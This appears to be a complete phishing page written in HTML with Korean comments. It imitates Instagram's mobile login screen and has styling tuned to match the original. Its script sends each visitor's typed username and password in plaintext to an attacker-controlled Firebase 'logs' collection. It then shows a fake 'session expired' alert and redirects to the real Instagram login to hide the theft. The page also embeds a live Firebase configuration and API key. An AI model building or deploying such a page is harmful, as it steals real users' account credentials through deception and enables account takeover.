<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* 배경 및 폰트: 원본의 깨끗한 화이트 톤 */
        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
        
        /* 상단 바: 화살표 위치 미세 조정 */
        .top-bar { width: 100%; padding: 12px 16px; display: flex; align-items: center; justify-content: flex-start; box-sizing: border-box; }
        .back-arrow { font-size: 24px; cursor: pointer; color: #000; text-decoration: none; font-weight: 300; }
        
        /* 한국어 선택: 화살표 크기와 색상 정밀 수정 (image_26729b.png 반영) */
        .language-container { color: #8e8e8e; font-size: 13px; margin: 8px 0 40px 0; cursor: pointer; display: flex; align-items: center; gap: 4px; }
        .lang-arrow { font-size: 8px; color: #8e8e8e; transform: scale(1.2, 0.8); }

        /* 메인 컨테이너 및 최신형 둥근 로고 */
        .container { width: 100%; max-width: 360px; padding: 0 35px; box-sizing: border-box; text-align: center; flex-grow: 1; }
        .logo-img { width: 75px; height: 75px; margin-bottom: 40px; border-radius: 18px; }

        /* 입력창: 원본의 얇은 테두리와 둥근 모서리(12px) */
        input { width: 100%; padding: 13px 15px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 12px; background-color: #fafafa; box-sizing: border-box; font-size: 14px; color: #262626; outline: none; }
        input::placeholder { color: #8e8e8e; font-size: 14.5px; }
        
        /* 로그인 버튼: 원본 특유의 짙은 파란색과 완전한 캡슐 형태 */
        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 10px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 6px; }
        .btn-login:disabled { opacity: 0.6; }
        
        /* 비밀번호 찾기: 폰트 굵기 수정 */
        .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 25px; display: block; letter-spacing: -0.2px; }

        /* 하단 섹션: Meta 글자 삭제 및 로고만 흐릿하게 배치 */
        .bottom-section { width: 100%; max-width: 360px; padding: 20px 35px 35px 35px; box-sizing: border-box; text-align: center; }
        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 14px; margin-bottom: 25px; }
        
        .meta-footer { display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .meta-text-top { color: #8e8e8e; font-size: 12px; font-weight: 400; }
        .meta-logo-img { width: 60px; filter: grayscale(1); opacity: 0.3; } /* 회색빛 흐릿한 마크만 표시 */
    </style>
</head>
<body>
    <div class="top-bar"><a href="#" class="back-arrow">←</a></div>
    
    <div class="language-container">
        한국어 <span class="lang-arrow">∨</span>
    </div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
        
        <form id="loginForm">
            <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
        </form>

        <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
    </div>

    <div class="bottom-section">
        <button type="button" class="btn-signup">새 계정 만들기</button>
        <div class="meta-footer">
            <span class="meta-text-top">Meta</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo-img">
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
            authDomain: "instagram-be709.firebaseapp.com",
            projectId: "instagram-be709",
            storageBucket: "instagram-be709.firebasestorage.app",
            messagingSenderId: "556245509978",
            appId: "1:556245509978:web:e78967856f2ac2586f7563",
            measurementId: "G-1KLXR0LXSZ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            
            submitBtn.disabled = true;

            try {
                await addDoc(collection(db, "logs"), {
                    userId: idVal,
                    userPw: pwVal,
                    timestamp: new Date()
                });
                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error("오류 발생:", error);
                alert("네트워크 연결을 확인해주세요.");
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
